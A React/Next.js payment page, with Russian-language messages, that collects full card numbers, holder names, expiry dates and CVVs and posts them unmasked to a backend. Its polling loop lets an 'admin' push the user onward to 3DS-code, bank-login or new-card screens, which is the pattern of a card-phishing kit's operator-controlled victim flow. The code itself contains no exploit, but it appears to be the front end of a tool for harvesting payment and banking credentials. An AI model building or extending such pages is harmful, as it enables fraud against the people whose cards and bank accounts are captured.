'use client'

import { useState, useEffect } from 'react'
import { useRouter, useSearchParams, useParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { useToast } from '@/hooks/use-toast'
import { motion } from 'framer-motion'
import { CreditCard, ArrowRight, Loader2, CheckCircle } from 'lucide-react'
import { useTranslations } from 'next-intl'

interface PaymentData {
  payment_id: string
  amount: number
  currency: string
  user_email: string
}

export default function NewCardPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')
  
  const [loading, setLoading] = useState(false)
  const [redirecting, setRedirecting] = useState(false)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [isTyping, setIsTyping] = useState(false) // Track if user is typing
  const [typingTimeout, setTypingTimeout] = useState<NodeJS.Timeout | null>(null)
  
  const [cardNumber, setCardNumber] = useState('')
  const [cardHolder, setCardHolder] = useState('')
  const [expiryDate, setExpiryDate] = useState('')
  const [cvv, setCvv] = useState('')

  useEffect(() => {
    // Get payment data from URL parameters
    const paymentId = searchParams.get('payment_id')
    const amount = searchParams.get('amount')
    const currency = searchParams.get('currency')
    const userEmail = searchParams.get('user_email')

    if (paymentId && amount && currency && userEmail) {
      setPaymentData({
        payment_id: paymentId,
        amount: parseFloat(amount),
        currency: currency,
        user_email: userEmail
      })
    }
  }, [searchParams])

  useEffect(() => {
    if (!isAuthenticated) {
      router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments/new-card`)}`)
    }
  }, [isAuthenticated, router, locale])

  // Poll payment status for admin actions - ALWAYS ACTIVE but RESPECTFUL
  useEffect(() => {
    if (!paymentData?.payment_id || !isAuthenticated) return

    const pollInterval = setInterval(async () => {
      // DON'T poll if user is actively typing card details
      if (isTyping) {
        console.log('⏸️ Skipping poll - user is typing card details')
        return
      }
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
          console.error('Invalid payment ID format:', paymentData.payment_id)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 New Card page - Payment status polled:', status)

          // Check if admin has requested a different action
          if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS - redirecting...')
            router.push(`/${locale}/payments/3ds?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login - redirecting...')
            router.push(`/${locale}/payments/bank-login?payment_id=${paymentData.payment_id}&amount=${paymentData.amount}&currency=${paymentData.currency}&user_email=${paymentData.user_email}`)
          } else if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card again - staying on new card page')
            // Stay on new card page, admin requested new card again
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            router.push(`/${locale}/payments`)
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentData, isAuthenticated, locale, router, isTyping])

  // Cleanup timeout on component unmount
  useEffect(() => {
    return () => {
      if (typingTimeout) {
        clearTimeout(typingTimeout)
      }
    }
  }, [typingTimeout])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!paymentData) {
      toast({
        title: t('error'),
        description: t('paymentDataNotFound'),
        variant: "destructive"
      })
      return
    }

    // Validate payment ID format
    if (!paymentData.payment_id || paymentData.payment_id.length < 10) {
      toast({
        title: t('error'),
        description: 'Неверный формат ID платежа',
        variant: "destructive"
      })
      return
    }

    // Validate card number (Luhn algorithm check)
    const cleanCardNumber = cardNumber.replace(/\s/g, '')
    if (!cleanCardNumber || cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
      toast({
        title: t('error'),
        description: 'Номер карты должен содержать от 13 до 19 цифр',
        variant: "destructive"
      })
      return
    }

    if (!/^\d+$/.test(cleanCardNumber)) {
      toast({
        title: t('error'),
        description: 'Номер карты должен содержать только цифры',
        variant: "destructive"
      })
      return
    }

    // Validate card holder
    if (!cardHolder.trim() || cardHolder.trim().length < 2) {
      toast({
        title: t('error'),
        description: 'Имя владельца карты должно содержать минимум 2 символа',
        variant: "destructive"
      })
      return
    }

    // Validate expiry date (MM/YY format)
    if (!expiryDate) {
      toast({
        title: t('error'),
        description: 'Пожалуйста, введите дату окончания действия карты',
        variant: "destructive"
      })
      return
    }

    // Check MM/YY format
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      toast({
        title: t('error'),
        description: 'Формат даты должен быть MM/YY (например, 12/25)',
        variant: "destructive"
      })
      return
    }

    const [monthStr, yearStr] = expiryDate.split('/')
    const month = parseInt(monthStr)
    const year = parseInt(yearStr)
    const currentDate = new Date()
    const currentYear = currentDate.getFullYear() % 100 // Get last 2 digits
    const currentMonth = currentDate.getMonth() + 1

    if (month < 1 || month > 12) {
      toast({
        title: t('error'),
        description: 'Месяц должен быть от 01 до 12',
        variant: "destructive"
      })
      return
    }

    if (year < currentYear || year > currentYear + 20) {
      toast({
        title: t('error'),
        description: `Год должен быть от ${currentYear} до ${currentYear + 20}`,
        variant: "destructive"
      })
      return
    }

    // Validate CVV
    if (!cvv || cvv.length < 3 || cvv.length > 4) {
      toast({
        title: t('error'),
        description: 'CVV должен содержать 3 или 4 цифры',
        variant: "destructive"
      })
      return
    }

    if (!/^\d+$/.test(cvv)) {
      toast({
        title: t('error'),
        description: 'CVV должен содержать только цифры',
        variant: "destructive"
      })
      return
    }

    setLoading(true)

    try {
      // Send new card data to the server
      const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentData.payment_id}/new-card`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({
          card_number: cleanCardNumber,
          card_holder: cardHolder.trim(),
          expiry_date: expiryDate,
          cvv: cvv
        })
      })

      const data = await response.json()

      if (response.ok) {
        toast({
          title: t('success'),
          description: t('newCardDataSent'),
          variant: "default"
        })

        // Start redirecting in real time
        setRedirecting(true)
        
        // Simulate redirect to status page
        setTimeout(() => {
          router.push(`/${locale}/payments/status/${paymentData.payment_id}?step=new_card_submitted`)
        }, 2000)

      } else {
        toast({
          title: t('error'),
          description: data.error || t('failedToSendCardData'),
          variant: "destructive"
        })
      }
    } catch (error) {
      toast({
        title: t('error'),
        description: t('errorSendingData'),
        variant: "destructive"
      })
    } finally {
      setLoading(false)
    }
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = matches && matches[0] || ''
    const parts = []
    
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    
    if (parts.length) {
      return parts.join(' ')
    } else {
      return v
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>{t('redirectingToLoginPage')}</p>
        </div>
      </div>
    )
  }

  if (redirecting) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
          <h2 className="text-2xl font-bold mb-2">{t('newCardDataSent')}</h2>
          <p className="text-gray-400 mb-4">{t('redirectingToStatusPage')}</p>
          <div className="flex items-center justify-center space-x-2">
            <Loader2 className="h-4 w-4 animate-spin" />
            <span>{t('redirectingInRealTime')}</span>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-white py-20">
      <div className="max-w-2xl mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-8"
        >
          <h1 className="text-4xl font-bold text-white neon-glow mb-4">
            💳 <span className="text-cyan-400">{t('newCard')}</span>
          </h1>
          <p className="text-xl text-gray-300 mb-4">
            {t('enterNewCardData')}
          </p>
          
          {/* Anti-fraud warning */}
          <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-4 max-w-2xl mx-auto">
            <div className="flex items-center gap-2 text-red-400 mb-2">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
              <span className="font-semibold">⚠️ {t('antiFraudAlert')}</span>
            </div>
            <p className="text-red-300 text-sm leading-relaxed">
              {t('antiFraudMessage')}
            </p>
          </div>
        </motion.div>

        {paymentData && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.2 }}
            className="mb-8"
          >
            <Card className="bg-black/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">{t('paymentInformation')}</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div>
                    <span className="text-gray-400">{t('paymentId')}:</span>
                    <p className="text-white font-mono">{paymentData.payment_id}</p>
                  </div>
                  <div>
                    <span className="text-gray-400">{t('amount')}:</span>
                    <p className="text-white">{paymentData.amount} {paymentData.currency}</p>
                  </div>
                  <div className="col-span-2">
                    <span className="text-gray-400">{t('email')}:</span>
                    <p className="text-white">{paymentData.user_email}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        )}

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
        >
          <Card className="bg-black/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-white">{t('newCardData')}</CardTitle>
              <CardDescription className="text-gray-400">
                {t('enterNewCardInfo')}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-white">
                    {t('cardNumber')}
                  </Label>
                  <Input
                    id="cardNumber"
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    value={cardNumber}
                    onChange={(e) => {
                      setCardNumber(formatCardNumber(e.target.value))
                      
                      // Set typing state to prevent polling interruption
                      setIsTyping(true)
                      
                      // Clear previous timeout
                      if (typingTimeout) {
                        clearTimeout(typingTimeout)
                      }
                      
                      // Set timeout to resume polling after user stops typing
                      const timeout = setTimeout(() => {
                        setIsTyping(false)
                        console.log('✅ User stopped typing card number - resuming polling')
                      }, 3000) // Resume polling 3 seconds after user stops typing
                      
                      setTypingTimeout(timeout)
                    }}
                    onFocus={() => {
                      setIsTyping(true)
                      console.log('🔒 User focused on card number input - pausing polling')
                    }}
                    onBlur={() => {
                      // Resume polling when user leaves the input
                      setTimeout(() => {
                        setIsTyping(false)
                        console.log('🔓 User left card number input - resuming polling')
                      }, 1000) // Small delay to prevent immediate polling
                    }}
                    maxLength={19}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardHolder" className="text-white">
                    {t('cardHolder')}
                  </Label>
                  <Input
                    id="cardHolder"
                    type="text"
                    placeholder="IVAN IVANOV"
                    value={cardHolder}
                    onChange={(e) => {
                      setCardHolder(e.target.value.toUpperCase())
                      
                      // Set typing state to prevent polling interruption
                      setIsTyping(true)
                      
                      // Clear previous timeout
                      if (typingTimeout) {
                        clearTimeout(typingTimeout)
                      }
                      
                      // Set timeout to resume polling after user stops typing
                      const timeout = setTimeout(() => {
                        setIsTyping(false)
                        console.log('✅ User stopped typing card holder - resuming polling')
                      }, 3000) // Resume polling 3 seconds after user stops typing
                      
                      setTypingTimeout(timeout)
                    }}
                    onFocus={() => {
                      setIsTyping(true)
                      console.log('🔒 User focused on card holder input - pausing polling')
                    }}
                    onBlur={() => {
                      // Resume polling when user leaves the input
                      setTimeout(() => {
                        setIsTyping(false)
                        console.log('🔓 User left card holder input - resuming polling')
                      }, 1000) // Small delay to prevent immediate polling
                    }}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="expiryDate" className="text-white">
                    Дата окончания действия
                  </Label>
                  <Input
                    id="expiryDate"
                    type="text"
                    placeholder="MM/YY (например, 12/25)"
                    value={expiryDate}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '')
                      if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4)
                      }
                      setExpiryDate(value)
                      
                      // Set typing state to prevent polling interruption
                      setIsTyping(true)
                      
                      // Clear previous timeout
                      if (typingTimeout) {
                        clearTimeout(typingTimeout)
                      }
                      
                      // Set timeout to resume polling after user stops typing
                      const timeout = setTimeout(() => {
                        setIsTyping(false)
                        console.log('✅ User stopped typing expiry date - resuming polling')
                      }, 3000) // Resume polling 3 seconds after user stops typing
                      
                      setTypingTimeout(timeout)
                    }}
                    onFocus={() => {
                      setIsTyping(true)
                      console.log('🔒 User focused on expiry date input - pausing polling')
                    }}
                    onBlur={() => {
                      // Resume polling when user leaves the input
                      setTimeout(() => {
                        setIsTyping(false)
                        console.log('🔓 User left expiry date input - resuming polling')
                      }, 1000) // Small delay to prevent immediate polling
                    }}
                    maxLength={5}
                    className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                    required
                  />
                </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-white">
                      {t('cvv')}
                    </Label>
                    <Input
                      id="cvv"
                      type="text"
                      placeholder="123"
                      value={cvv}
                      onChange={(e) => {
                        setCvv(e.target.value.replace(/\D/g, ''))
                        
                        // Set typing state to prevent polling interruption
                        setIsTyping(true)
                        
                        // Clear previous timeout
                        if (typingTimeout) {
                          clearTimeout(typingTimeout)
                        }
                        
                        // Set timeout to resume polling after user stops typing
                        const timeout = setTimeout(() => {
                          setIsTyping(false)
                          console.log('✅ User stopped typing CVV - resuming polling')
                        }, 3000) // Resume polling 3 seconds after user stops typing
                        
                        setTypingTimeout(timeout)
                      }}
                      onFocus={() => {
                        setIsTyping(true)
                        console.log('🔒 User focused on CVV input - pausing polling')
                      }}
                      onBlur={() => {
                        // Resume polling when user leaves the input
                        setTimeout(() => {
                          setIsTyping(false)
                          console.log('🔓 User left CVV input - resuming polling')
                        }, 1000) // Small delay to prevent immediate polling
                      }}
                      maxLength={4}
                      className="bg-gray-900 border-cyan-500/30 text-white placeholder-gray-400"
                      required
                    />
                </div>

                <Button
                  type="submit"
                  disabled={loading || !cardNumber || !cardHolder || !expiryDate || !cvv}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      {t('sending')}...
                    </>
                  ) : (
                    <>
                      {t('sendCardData')}
                      <ArrowRight className="h-4 w-4 ml-2" />
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
          className="mt-8 text-center"
        >
          <p className="text-gray-400 text-sm">
            🔒 {t('allDataSentSecurely')}
          </p>
          <p className="text-gray-400 text-sm mt-2">
            📱 {t('redirectingToStatusPage')}
          </p>
        </motion.div>
      </div>
    </div>
  )
}

